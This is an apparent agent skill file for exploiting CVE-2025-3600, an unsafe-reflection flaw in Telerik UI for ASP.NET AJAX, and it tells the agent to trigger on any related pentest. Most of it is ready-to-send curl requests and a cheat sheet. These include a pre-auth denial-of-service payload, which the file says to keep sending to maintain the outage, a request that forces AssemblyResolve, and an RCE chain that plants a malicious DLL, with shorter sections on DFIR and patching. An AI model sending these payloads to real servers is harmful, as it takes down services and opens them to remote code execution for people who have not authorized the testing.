---
name: telerik-unsafe-reflection-cve-2025-3600
description: Exploit CVE-2025-3600 in Telerik UI for ASP.NET AJAX (versions 2011.2.712 through 2025.1.218) for pre-auth DoS and RCE via unsafe reflection in WebResource.axd. Use this skill whenever you need to test for Telerik vulnerabilities, assess .NET web applications for pre-auth code execution, or investigate CVE-2025-3600. Trigger this skill for any pentest involving ASP.NET AJAX, Telerik components, or when you see WebResource.axd endpoints.
---

# Telerik UI for ASP.NET AJAX – CVE-2025-3600 Exploitation

## Overview

CVE-2025-3600 is a pre-auth constructor execution vulnerability in Telerik UI for ASP.NET AJAX's Image Editor cache handler (`WebResource.axd?type=iec`). The handler resolves a type name from the `prtype` parameter using `Type.GetType()` and invokes `Activator.CreateInstance()` **before** validating interface type-safety. This enables:

- **Universal pre-auth DoS** using .NET framework gadgets (PowerShell WSMan finalizer)
- **Pre-auth RCE** in many deployments via app-specific gadgets (insecure `AppDomain.AssemblyResolve` handlers, deserialization chains, etc.)

**Affected versions:** 2011.2.712 through 2025.1.218 (inclusive)
**Fixed in:** 2025.1.416 (released 2025-04-30)

## Discovery

### Step 1: Check for Telerik handler exposure

```bash
# Basic presence check - should return something other than 404/403
curl -I "http://target/Telerik.Web.UI.WebResource.axd"

# Check for the vulnerable endpoint
curl -I "http://target/Telerik.Web.UI.WebResource.axd?type=iec"
```

### Step 2: Inspect web.config (if accessible)

Look for handler mappings:
```xml
<add name="Telerik.Web.UI.WebResource" path="Telerik.Web.UI.WebResource.axd" type="Telerik.Web.UI.WebResource, Telerik.Web.UI" />
```

### Step 3: Probe for vulnerability

Use the discovery script:
```bash
python scripts/discover_telerik.py http://target
```

Or manually probe:
```bash
# Generic trigger - look for 200 OK or unusual response
curl -v "http://target/Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.String, mscorlib"
```

## Exploitation

### Universal DoS (No app-specific gadgets required)

The PowerShell WSMan finalizer gadget reliably crashes the IIS worker process:

```bash
# One-shot DoS request
curl "http://target/Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper%2c+System.Management.Automation%2c+Version%253d3.0.0.0%2c+Culture%253dneutral%2c+PublicKeyToken%253d31bf3856ad364e35"
```

**Notes:**
- The constructor runs immediately; crash occurs on GC finalization
- Keep sending periodically to maintain DoS
- Monitor for app pool recycle or w3wp.exe crashes

### RCE Escalation Patterns

Unsafe constructor execution unlocks target-specific gadgets. Hunt for:

#### 1. Constructors that process attacker input
Some constructors read HTTP request data and deserialize it:
- Check for JSON.NET, XML deserialization in constructor chains
- Example: Sitecore's `GetLayoutDefinition()` reads HTTP body "layout" parameter

#### 2. Constructors that touch files
Constructors loading config/blobs from disk can be coerced if you control those paths:
- Upload directories
- Temp folders
- Data directories

#### 3. AppDomain.AssemblyResolve handlers
Many apps register insecure resolvers that build DLL paths from `args.Name`:

```bash
# Force type resolution to trigger AssemblyResolve
curl "http://target/Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=This.Class.Does.Not.Exist%2c+watchTowr"
```

**Chain example (Sitecore XP):**
1. Trigger type that registers insecure resolver (e.g., `Sitecore.Shell.Xaml.WebControl`)
2. Plant malicious DLL in resolver-probed directory (via upload/auth bypass)
3. Use CVE-2025-3600 with traversal-laden assembly name to load your DLL

#### 4. Finalizers with destructive side effects
Some types delete fixed-path files in finalizers. Combined with predictable paths, this can enable local privilege escalation.

### Using the exploit script

```bash
# Run DoS payload
python scripts/exploit_telerik.py --url http://target --mode dos

# Run with custom type
python scripts/exploit_telerik.py --url http://target --type "Namespace.Type, Assembly"

# Force AssemblyResolve
python scripts/exploit_telerik.py --url http://target --mode resolve --assembly watchTowr
```

## Validation and DFIR

### Safe lab validation
1. Fire the DoS payload
2. Watch for app pool recycle or unhandled exception
3. Check IIS logs for the WSMan finalizer crash

### Hunt in telemetry
- Requests to `/Telerik.Web.UI.WebResource.axd` with `type=iec` and unusual `prtype` values
- Failed type loads and `AppDomain.AssemblyResolve` events
- Sudden `w3wp.exe` crashes following such requests

## Mitigation

### Immediate actions
1. **Patch** to Telerik UI for ASP.NET AJAX 2025.1.416 or later
2. **Remove or restrict** `Telerik.Web.UI.WebResource.axd` exposure (WAF/rewrites)
3. **Lock down** the handler if patching isn't immediately possible

### Long-term hardening
- Audit and harden custom `AppDomain.AssemblyResolve` handlers
- Avoid building paths from `args.Name` without sanitization
- Prefer strong-named loads or whitelists
- Constrain upload/write locations
- Monitor for non-existent type load attempts

## Cheat Sheet

| Action | Command |
|--------|---------|
| Presence check | `GET /Telerik.Web.UI.WebResource.axd` |
| Vulnerability probe | `GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.String, mscorlib` |
| Universal DoS | `GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35` |
| Force AssemblyResolve | `GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=This.Class.Does.Not.Exist, watchTowr` |

## References

- [watchTowr labs – CVE-2025-3600 Analysis](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
- [Black Hat USA 2019 – SSO Wars: The Token Menace](https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace-wp.pdf)
- [ZDI – Abusing arbitrary file deletes](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [watchTowr – Sitecore RCE Chain CVE-2025-34509](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)
